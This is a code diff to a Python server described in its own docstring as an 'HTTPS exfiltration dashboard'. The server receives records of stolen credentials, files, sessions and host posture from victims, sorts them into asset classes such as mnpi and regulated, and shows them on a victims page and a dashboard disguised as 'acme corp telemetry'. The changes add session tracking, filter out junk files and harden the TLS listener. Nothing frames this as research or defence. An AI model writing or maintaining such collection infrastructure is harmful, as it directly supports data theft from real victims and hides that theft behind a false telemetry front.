@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """dnsproxy_ingest - HTTPS exfiltration dashboard on the DNS server.
 
-  POST /ingest        JSON record {target,user,ts,creds,files,datasets,posture,primitives,assets} -> append JSONL
+  POST /ingest        JSON record {target,user,ts,creds,files,sessions,posture,primitives,assets} -> append JSONL
   GET  /              investor animation (investor.html) with live /api/records
-  GET  /dashboard     plain HTML table: target | user | credentials | files | datasets | posture
+  GET  /dashboard     plain HTML table: target | user | credentials | files | sessions | posture
   GET  /victims       asset register page (victims.html): victim -> core_ip/mnpi/regulated/ot_iot
   GET  /api/records   JSON of all records
   GET  /api/victims   JSON of records grouped per target+user with classified assets
@@ -55,6 +55,8 @@ def classify(rec):
     for f in rec.get("files") or []:
         p = str(f.get("path", ""))
         size = f"{f.get('size', 0) or 0} B"
+        if re.match(r"(?i)^(desktop\.ini|thumbs\.db|ntuser)", p.replace("\\", "/").rsplit("/", 1)[-1]):
+            continue
         hit = next((cls for cls, rx in FILE_RULES if rx.search(p)), None)
         if hit:
             cap(hit, {"src": "key" if f.get("kind") == "credential" else "file", "label": p, "value": size})
@@ -67,10 +69,6 @@ def classify(rec):
             continue
         v = str(c.get("value", ""))[:160]
         cap("core_ip" if CRED_IP.search(k) else "mnpi", {"src": "credential", "label": k, "value": v})
-    for d in rec.get("datasets") or []:
-        cap("regulated", {"src": "dataset",
-                          "label": str(d.get("name") or d.get("id") or ""),
-                          "value": str(d.get("agency") or "")})
     return assets
 
 
@@ -85,7 +83,7 @@ def victims():
                 "ts": str(r.get("ts", "")), "last": str(r.get("ts", "")),
                 "platform": str(r.get("platform") or ""),
                 "assets": {c: [] for c in ASSET_CLASSES},
-                "posture": {}, "scanner": None,
+                "posture": {}, "primitives": None, "scanner": None,
             }
         g["runs"] += 1
         ts = str(r.get("ts", ""))
@@ -96,6 +94,7 @@ def victims():
             if cls in g["assets"]:
                 g["assets"][cls].extend(items)
         g["posture"] = r.get("posture") or g["posture"]
+        g["primitives"] = r.get("primitives") or g["primitives"]
         sc = (r.get("posture") or {}).get("scanner")
         if sc:
             g["scanner"] = sc
@@ -130,7 +129,7 @@ def dashboard():
     for r in records:
         creds = r.get("creds", [])
         files = r.get("files", [])
-        datasets = r.get("datasets", [])
+        sessions = r.get("sessions", [])
         cred_html = "<br>".join(
             f"<code>{html.escape(str(c.get('kind','?')))}</code> "
             f"<span class=v>{html.escape(str(c.get('value',''))[:80])}</span>"
@@ -144,14 +143,13 @@ def dashboard():
                 f"<i>({f.get('size','?')}b)</i>" for f in files[:12])
             if len(files) > 12:
                 file_html += f"<br><i>+{len(files)-12} more…</i>"
-        ds_html = f"{len(datasets)} datasets"
-        if datasets:
-            ds_html += "<br>" + "<br>".join(
-                f"<span class=f>{html.escape(str(d.get('name',''))[:60])}</span> "
-                f"<i>({html.escape(str(d.get('agency',''))[:40])})</i>"
-                for d in datasets[:8])
-            if len(datasets) > 8:
-                ds_html += f"<br><i>+{len(datasets)-8} more…</i>"
+        sess_html = f"{len(sessions)} sessions"
+        if sessions:
+            sess_html += "<br>" + "<br>".join(
+                f"<span class=f>{html.escape(str(s)[:60])}</span>"
+                for s in sessions[:8])
+            if len(sessions) > 8:
+                sess_html += f"<br><i>+{len(sessions)-8} more…</i>"
         posture = r.get("posture") or {}
         p_bits = []
         if "uid" in posture:
@@ -168,7 +166,7 @@ def dashboard():
             f"<tr><td>{html.escape(str(r.get('ts','')))}</td>"
             f"<td><b>{html.escape(str(r.get('target','?')))}</b><br>"
             f"{html.escape(str(r.get('user','?')))}</td>"
-            f"<td class=c>{cred_html}</td><td>{file_html}</td><td>{ds_html}</td><td>{p_html}</td></tr>")
+            f"<td class=c>{cred_html}</td><td>{file_html}</td><td>{sess_html}</td><td>{p_html}</td></tr>")
     body = "\n".join(rows) or "<tr><td colspan=6><i>no records yet</i></td></tr>"
     return f"""<!doctype html><html><head><meta charset=utf-8>
 <title>acme telemetry</title><style>
@@ -179,7 +177,7 @@ th{{background:#111827;color:#7dd3fc;text-align:left}} .v{{color:#fbbf24;font-si
 .f{{color:#86efac;font-size:.78rem}} i{{color:#64748b}} code{{color:#f472b6}}
 tr:hover{{background:#0f172a}}</style></head><body>
 <h1>acme corp — telemetry intake :: {len(records)} record(s)</h1>
-<table><tr><th>time</th><th>target / user</th><th>credentials</th><th>files</th><th>datasets</th><th>posture</th></tr>
+<table><tr><th>time</th><th>target / user</th><th>credentials</th><th>files</th><th>sessions</th><th>posture</th></tr>
 {body}</table></body></html>"""
 
 
@@ -261,6 +259,8 @@ def shell_exec(payload):
 
 
 class H(BaseHTTPRequestHandler):
+    timeout = 20   # bound every read: an idle/TLS-probe client must not leak a thread
+
     def _send(self, code, body, ctype):
         if isinstance(body, str):
             body = body.encode()
@@ -295,7 +295,7 @@ class H(BaseHTTPRequestHandler):
             print(f"[-] persist: {e}")
         print(f"[+] ingest target={rec.get('target')} user={rec.get('user')} "
               f"creds={len(rec.get('creds', []))} files={len(rec.get('files', []))} "
-              f"datasets={len(rec.get('datasets', []))}", flush=True)
+              f"sessions={len(rec.get('sessions', []))}", flush=True)
         self._send(200, '{"ok":true}', "application/json")
 
     def do_GET(self):
@@ -353,7 +353,8 @@ def main():
     srv = ThreadingHTTPServer(("0.0.0.0", PORT), H)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     ctx.load_cert_chain(CERT, KEY)
-    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
+    srv.socket = ctx.wrap_socket(srv.socket, server_side=True,
+                                 do_handshake_on_connect=False)
     print(f"[*] dnsproxy_ingest https://0.0.0.0:{PORT} records={len(records)} data={DATA}")
     srv.serve_forever()
 
